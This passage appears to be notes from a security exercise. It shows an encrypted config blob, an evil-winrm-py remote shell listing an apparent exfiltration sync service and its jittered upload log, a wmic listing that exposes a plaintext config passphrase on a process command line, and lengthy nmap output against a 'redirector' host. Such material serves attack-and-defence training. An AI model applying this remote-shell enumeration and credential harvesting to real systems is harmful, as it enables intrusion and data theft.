    "CipherTextBase64":  "kUwAPbf+f4VgEwLCPXkKbRU2L5CO1NL7Dnm1uScB7s8+B0Y+zNeAAKWhrfMY4tuWbjM8Q1Cn0edrk9g7reY5U25riil7ICbAJNi6AUJBlNnQq32CpjuFWfgturzuOPSUYyRAdFBJV3QhygeWANx4mTPWwOjYKE0F3wHPzqTWzS03U4c6WegD8ltufv0i3youl59Cw9tLhYoVZf8XSQ8NOS4PLXv/ohz/blmjbIAtxL4dU91S0yzqF4H6rew9HHbph4Hfpzc9yB0Hz6us86vIcVPNMzQlMSYfBTdV5f6vmoDwusedevnqMFNyfhaq4wztVWjbDw2H2v8lrdHlpCAbw/XvogSRczxRpWayGKnnEVXqd9ruu4RGVFx8XCkYMasqzaTslMifFC5buP5izkHIo0gnebzex04YpijMD9sciCGXQ7VeGqUuc46FFtoDok+FONbo+NvH7113m0/3CuwJv5ZMEwkLz+Rhq37yrhl/cHK9Ta437n181zWnT1CIcj7h+1NjYM+Wk7YPusZMR5iDWvaEcXWvjzLSxsR6CJ+3tLiTA/r3YNb6fu8YP0K1jcCi7GlbQyjBUJeSFhLKtyVuWSRNr0NGxV6Mtba/KNPd2nStlo96FYjLgNBDFK6K2MCadw0mbXnkIQo/AEG2cPN2FcAwxsYoB8HZ0uusPLBSHNv1LfCed6eQEMT/nf2VBxXdNIe7zYShP+EKR9pvxfepg23msZ6bHwwnlLhXsVbYRLkKyvVH9OojpuB3zLVYMZ/DxmgkvEVpJC2n1ln2KNpc6ut9OHQeaDx9QXfjDBv6Brg1+QaBvudgNZyrvSibM3aFCQcgDPS0ff9nipsKQ/m3a+bNzwChXlJkGCjLTtpW80geJKijnOdtkQVA90psiwNQBn5PSv5+pruJgYEr8Ysy3gwgry5hqVFMgpz8c6PupmXjYsPtRD4VvObl8R372Oxxjl2Ug0GVNxP+nuWcz1YR6/IGCRSSFgem5W4bB6ry6/ym10c07loquyppuK53qJ9ixuFMSn9d+kzNFHUe1l2ItDDhOSFpvrkeFjy/1/4aLRUqcbA4e/rmQlWJ5Fbu7roh9EhAEz+Dhsmmo1sowAxtilkNQTL/qzYzFBlGnfrW27TK3fXzdTQUAY+94jTJaPf9OKOoXLt+uL+N6fvSNkR3IvY7TyfJRsBHUeU1cOiJ7dzZyYGr4/0DXkWXQDET/bDk/VVpd1eaLjD1/Eql/1mqPSITFAuolC+iwNIn/XhHrVai76T43bW/FyHnM2zERm12vGd/TiXS2Gvz4DhihqR6aWydde4dirSTi34QlU/xqBY9730w8RiWzhmc02eeYR/FOMTzw7ViB7ifATcyKPT3GAvpb3AYisf8OsIkrE+uGjTwVOxJ/36R5DQNZ1L4GGGFcYk4ZjLFobNQ6xj5hQWxsabvWrQCQGa1A0nQBcM3bXpgc098AtdwE4/23C13MRXtha1zGl6NVD99frIGsfRYDHZo49mXOU4mzfkHklPC0Hzs6BPlhpY45o2TEvU0hyrpmSReZ3TmI9+bySlFOvE0P/gjyl8sPWCt+5ePRERlc2k=",
    "SaltBase64":  "DPZ0kDT+oITx1misu24UlQ==",
    "IvBase64":  "gjJvHMlyrrEeB8M7twuo5Q==",
    "Kdf":  "PBKDF2-SHA1-10000",
    "Cipher":  "AES-256-CBC"
}

```

# c:\programdata\synccache\
```
evil-winrm-py PS C:\programdata\SyncCache> dir

    Directory: C:\programdata\SyncCache

Mode                 LastWriteTime         Length Name                                                        
----                 -------------         ------ ----                                                        
-a----         4/28/2026   2:57 PM           1011 BLUENET-BLUE05_20260428_185718.zip                          
-a----         6/10/2026   8:29 AM           1120 BLUENET-BLUE05_20260610_122932.zip                          
-a----         6/10/2026   8:39 AM            875 BLUENET-BLUE05_20260610_123958.zip                          
-a----         6/15/2026  12:54 PM         317160 service.log 
```

# c:\programdata\synccache\service.log
```
<BREAK>
[2026-06-15T16:20:03.4306539Z] Starting sync cycle.
[2026-06-15T16:20:03.8837878Z] [JITTER] Sleeping 59 second(s) before scan.
[2026-06-15T16:21:15.2605403Z] Done. Uploaded=0 Pending=0 Skipped=253 Failed=0 StateFile=C:\ProgramData\file_sync_state.json
[2026-06-15T16:21:15.2761657Z] Sync cycle completed successfully.
[2026-06-15T16:31:15.2983784Z] Starting sync cycle.
[2026-06-15T16:31:15.7671341Z] [JITTER] Sleeping 33 second(s) before scan.
[2026-06-15T16:32:01.1125167Z] Done. Uploaded=0 Pending=0 Skipped=253 Failed=0 StateFile=C:\ProgramData\file_sync_state.json
[2026-06-15T16:32:01.1281391Z] Sync cycle completed successfully.
[2026-06-15T16:42:01.1630427Z] Starting sync cycle.
[2026-06-15T16:42:01.6317431Z] [JITTER] Sleeping 65 second(s) before scan.
[2026-06-15T16:43:19.1484137Z] Done. Uploaded=0 Pending=0 Skipped=253 Failed=0 StateFile=C:\ProgramData\file_sync_state.json
[2026-06-15T16:43:19.1640569Z] Sync cycle completed successfully.
[2026-06-15T16:53:19.1997190Z] Starting sync cycle.
[2026-06-15T16:53:19.6528235Z] [JITTER] Sleeping 75 second(s) before scan.
[2026-06-15T16:54:47.4826804Z] Done. Uploaded=0 Pending=0 Skipped=253 Failed=0 StateFile=C:\ProgramData\file_sync_state.json
[2026-06-15T16:54:47.4982976Z] Sync cycle completed successfully.
```

# Running Process showing config passphrase
```
evil-winrm-py PS C:\programdata\SyncCache> wmic process get name,commandline,processid | findstr sync
"powershell.exe" -NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\FileSync\file_sync_service_runner.ps1" -SyncScriptPath "C:\ProgramData\FileSync\file_sync.ps1" -EncryptedConfigPath "C:\ProgramData\sync_config.enc.json" -ConfigPassphrase "Counterstrike-Capstone" -IntervalSeconds 600  powershell.exe             3812
```
---
# Scanning the redirector (198.51.100.200)
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-15 13:07 -0400
Nmap scan report for 198.51.100.200
Host is up (0.0018s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT      STATE  SERVICE          VERSION
3000/tcp  open   ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js 15.1.0
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     Cache-Control: s-maxage=31536000, 
|     ETag: "xwcggixrkr873"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 10623
|     Date: Mon, 15 Jun 2026 17:07:55 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="/logo.svg"/><link rel="preload" as="image" href="/bakery-hero.png"/><link rel="stylesheet" href="/_next/static/css/07b47dcf3b43cab2.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-6061d34c2fbf1
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     X-Powered-By: Next.js 15.1.0
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Mon, 15 Jun 2026 17:07:55 GMT
|     Connection: close
|   Help, NCP: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
3001/tcp  open   nessus?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2444
|     ETag: W/"98c-RxUaxZHFr+/FSabMqXO58T7mz+U"
|     Date: Mon, 15 Jun 2026 17:07:55 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
|     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
|     <link rel="icon" type="image/svg+xml" href="/icon.svg" />
|     <link rel="manifest" href="/manifest.json" />
|     <meta name="theme-color" id="theme-color" content="" />
|     <meta name="description" content="Uptime Kuma monitoring tool" />
|     <title>Uptime Kuma</title>
|     <style> .noscript-message {
|     font-size: 20px;
|     text-align: center;
|     padding: 10px;
|     max-width: 500px;
|     marg
|   GetRequest: 
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     Location: /dashboard
|     Vary: Accept
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 32
|     Date: Mon, 15 Jun 2026 17:07:55 GMT
|     Connection: close
|     Found. Redirecting to /dashboard
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     Vary: Accept-Encoding
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Date: Mon, 15 Jun 2026 17:07:55 GMT
|     Connection: close
|_    GET,HEAD
3306/tcp  open   mysql            MariaDB 11.8.6
5432/tcp  open   postgresql       PostgreSQL DB 9.6.0 or later
8081/tcp  open   http             Apache Tomcat 9.0.98
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /admin.jsp: Possible admin folder
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=198.51.100.200
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://198.51.100.200:8081/admin.jsp
|     Form id: item
|_    Form action: order.jsp
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-dombased-xss: Couldn't find any DOM based XSS.
9000/tcp  open   http             Golang net/http server
|_http-dombased-xss: Couldn't find any DOM based XSS.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B9502DE06DB0D7
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 15 Jun 2026 17:08:05 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18B9502DE06DB0D7</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B9502A5E8168FC
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 15 Jun 2026 17:07:50 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18B9502A5E8168FC</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 15 Jun 2026 17:07:50 GMT
|_    Content-Length: 0
| http-cross-domain-policy: 
|   VULNERABLE:
|   Cross-domain and Client Access policies.
|     State: VULNERABLE
|       A cross-domain policy file specifies the permissions that a web client such as Java, Adobe Flash, Adobe Reader,
|       etc. use to access data across different domains. A client acces policy file is similar to cross-domain policy
|       but is used for M$ Silverlight applications. Overly permissive configurations enables Cross-site Request
|       Forgery attacks, and may allow third parties to access sensitive data meant for the user.
|     Check results:
|       /crossdomain.xml:
|         <?xml version="1.0"?><!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd"><cross-domain-policy><allow-access-from domain="*" secure="false" /></cross-domain-policy>
|     Extra information:
|       Trusted domains:*
|   
|     References:
|       https://www.owasp.org/index.php/Test_RIA_cross_domain_policy_%28OTG-CONFIG-008%29
|       http://acunetix.com/vulnerabilities/web/insecure-clientaccesspolicy-xml-file
|       http://gursevkalra.blogspot.com/2013/08/bypassing-same-origin-policy-with-flash.html
|       https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/CrossDomain_PolicyFile_Specification.pdf
|       http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html
|_      https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html
|_http-server-header: MinIO
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /crossdomain.xml: Adobe Flash crossdomain policy
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
9001/tcp  open   http             Golang net/http server
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <!doctype html><html lang="en"><head><meta charset="utf-8"/><base href="/"/><meta content="width=device-width,initial-scale=1" name="viewport"/><meta content="#081C42" media="(prefers-color-scheme: light)" name="theme-color"/><meta content="#081C42" media="(prefers-color-scheme: dark)" name="theme-color"/><meta content="MinIO Console" name="description"/><meta name="minio-license" content="agpl"/><link href="./styles/root-styles.css" rel="stylesheet"/><link href="./apple-icon-180x180.png" rel="apple-touch-icon" sizes="180x180"/><link href="./favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/><link href="./favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/><link href="./favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/><link href="./manifest.json" rel="manifest"/><link color="#3a4e54" href="./safari-pinned-tab.svg" rel="mask-icon"/><title>MinIO Console</title><script defer="defer" src="./static/js/main.bb7c7604.js"></script><link href="./static/css/main.e60e4760.css" rel="stylesheet"></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"><div id="preload"><img src="./images/background.svg"/> <img src="./images/background-wave-orig2.svg"/></div><div id="loader-block"><img src="./Loader.svg"/></div></div></body></html>
|     References:
|       http://www.exploit-db.com/exploits/1244/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 1309
|     Content-Security-Policy: default-src 'self' 'unsafe-eval' 'unsafe-inline'; script-src 'self' https://unpkg.com; connect-src 'self' https://unpkg.com;
|     Content-Type: text/html
|     Last-Modified: Mon, 15 Jun 2026 17:07:50 GMT
|     Referrer-Policy: strict-origin-when-cross-origin
|     Server: MinIO Console
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 15 Jun 2026 17:07:50 GMT
|_    <!doctype html><html lang="en"><head><meta charset="utf-8"/><base href="/"/><meta content="width=device-width,initial-scale=1" name="viewport"/><meta content="#081C42" media="(prefers-color-scheme: light)" name="theme-color"/><meta content="#081C42" media="(prefers-color-scheme: dark)" name="theme-color"/><meta content="MinIO Console" name="description"/><meta name="minio-license" content="agpl"/><link href="./s
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: MinIO Console
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
9002/tcp  open   http             Golang net/http server
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Security-Policy: script-src 'self' https://js.hsforms.net https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; object-src 'none'; frame-ancestors 'none'; frame-src https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/
|     Content-Type: text/plain; charset=utf-8
|     Vary: Accept-Encoding
|     X-Content-Type-Options: nosniff
|     Date: Mon, 15 Jun 2026 17:08:05 GMT
|     Content-Length: 19
|     page not found
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 307 Temporary Redirect
|     Content-Type: text/html; charset=utf-8
|     Location: /timeout.html
|     Date: Mon, 15 Jun 2026 17:07:50 GMT
|     Content-Length: 49
|     href="/timeout.html">Temporary Redirect</a>.
|   HTTPOptions: 
|     HTTP/1.0 307 Temporary Redirect
|     Location: /timeout.html
|     Date: Mon, 15 Jun 2026 17:07:50 GMT
|_    Content-Length: 0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
9003/tcp  closed unknown
9090/tcp  open   http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
10000/tcp closed snet-sensor-mgmt
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.98%I=7%D=6/15%Time=6A30316A%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,2B17,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20Next\.js\x201
SF:5\.1\.0\r\nVary:\x20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Pref
SF:etch,\x20Next-Router-Segment-Prefetch,\x20Accept-Encoding\r\nx-nextjs-c
SF:ache:\x20HIT\r\nx-nextjs-prerender:\x201\r\nx-nextjs-stale-time:\x20429
SF:4967294\r\nCache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"xwcgg
SF:ixrkr873\"\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-L
SF:ength:\x2010623\r\nDate:\x20Mon,\x2015\x20Jun\x202026\x2017:07:55\x20GM
SF:T\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"
SF:><head><meta\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20conten
SF:t=\"width=device-width,\x20initial-scale=1\"/><link\x20rel=\"preload\"\
SF:x20as=\"image\"\x20href=\"/logo\.svg\"/><link\x20rel=\"preload\"\x20as=
SF:\"image\"\x20href=\"/bakery-hero\.png\"/><link\x20rel=\"stylesheet\"\x2
SF:0href=\"/_next/static/css/07b47dcf3b43cab2\.css\"\x20data-precedence=\"
SF:next\"/><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"lo
SF:w\"\x20href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><scr
SF:ipt\x20src=\"/_next/static/chunks/4bd1b696-6061d34c2fbf1")%r(Help,2F,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(N
SF:CP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r
SF:\n")%r(HTTPOptions,12A,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nX-Powered
SF:-By:\x20Next\.js\x2015\.1\.0\r\nvary:\x20RSC,\x20Next-Router-State-Tree
SF:,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch\r\nAllow:\x2
SF:0GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no-cache,\x20no
SF:-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Mon,\x2015\x20Jun\
SF:x202026\x2017:07:55\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequ
SF:est,12A,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nX-Powered-By:\x20Next\.j
SF:s\x2015\.1\.0\r\nvary:\x20RSC,\x20Next-Router-State-Tree,\x20Next-Route
SF:r-Prefetch,\x20Next-Router-Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\
SF:x20HEAD\r\nCache-Control:\x20private,\x20no-cache,\x20no-store,\x20max-
SF:age=0,\x20must-revalidate\r\nDate:\x20Mon,\x2015\x20Jun\x202026\x2017:0
SF:7:55\x20GMT\r\nConnection:\x20close\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3001-TCP:V=7.98%I=7%D=6/15%Time=6A303165%P=x86_64-pc-linux-gnu%r(NC
SF:P,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\
SF:n")%r(GetRequest,EC,"HTTP/1\.1\x20302\x20Found\r\nX-Frame-Options:\x20S
SF:AMEORIGIN\r\nLocation:\x20/dashboard\r\nVary:\x20Accept\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nContent-Length:\x2032\r\nDate:\x20
SF:Mon,\x2015\x20Jun\x202026\x2017:07:55\x20GMT\r\nConnection:\x20close\r\
SF:n\r\nFound\.\x20Redirecting\x20to\x20/dashboard")%r(HTTPOptions,FC,"HTT
SF:P/1\.1\x20200\x20OK\r\nX-Frame-Options:\x20SAMEORIGIN\r\nVary:\x20Accep
SF:t-Encoding\r\nAllow:\x20GET,HEAD\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nContent-Length:\x208\r\nETag:\x20W/\"8-ZRAf8oNBS3Bjb/SU2GY
SF:ZCmbtmXg\"\r\nDate:\x20Mon,\x2015\x20Jun\x202026\x2017:07:55\x20GMT\r\n
SF:Connection:\x20close\r\n\r\nGET,HEAD")%r(RTSPRequest,FC,"HTTP/1\.1\x202
SF:00\x20OK\r\nX-Frame-Options:\x20SAMEORIGIN\r\nVary:\x20Accept-Encoding\
SF:r\nAllow:\x20GET,HEAD\r\nContent-Type:\x20text/html;\x20charset=utf-8\r
SF:\nContent-Length:\x208\r\nETag:\x20W/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\
SF:r\nDate:\x20Mon,\x2015\x20Jun\x202026\x2017:07:55\x20GMT\r\nConnection:
SF:\x20close\r\n\r\nGET,HEAD")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNS
SF:StatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:nection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(TLSSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Connection:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(X11Probe,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(FourOhFour
SF:Request,A5D,"HTTP/1\.1\x20200\x20OK\r\nX-Frame-Options:\x20SAMEORIGIN\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2024
SF:44\r\nETag:\x20W/\"98c-RxUaxZHFr\+/FSabMqXO58T7mz\+U\"\r\nDate:\x20Mon,
SF:\x2015\x20Jun\x202026\x2017:07:55\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<me
SF:ta\x20charset=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,\x20initial-scale=1\.0,\x20viewport-
SF:fit=cover\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"apple-touch-icon\"\x2
SF:0sizes=\"180x180\"\x20href=\"/apple-touch-icon\.png\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"icon\"\x20type=\"image/svg\+xml\"\x20href=\"/icon\.svg\
SF:"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"manifest\"\x20href=\"/manifest\
SF:.json\"\x20/>\n\x20\x20\x20\x20<meta\x20name=\"theme-color\"\x20id=\"th
SF:eme-color\"\x20content=\"\"\x20/>\n\x20\x20\x20\x20<meta\x20name=\"desc
SF:ription\"\x20content=\"Uptime\x20Kuma\x20monitoring\x20tool\"\x20/>\n\x
SF:20\x20\x20\x20<title>Uptime\x20Kuma</title>\n\x20\x20\x20\x20<style>\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\.noscript-message\x20{\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2020px;\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20max-width:\x20500px;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20marg");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9000-TCP:V=7.98%I=7%D=6/15%Time=6A303165%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAcc
SF:ept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20appl
SF:ication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-ag
SF:e=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20d
SF:d9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-Am
SF:z-Request-Id:\x2018B9502A5E8168FC\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2015\x20Jun
SF:\x202026\x2017:07:50\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encodi
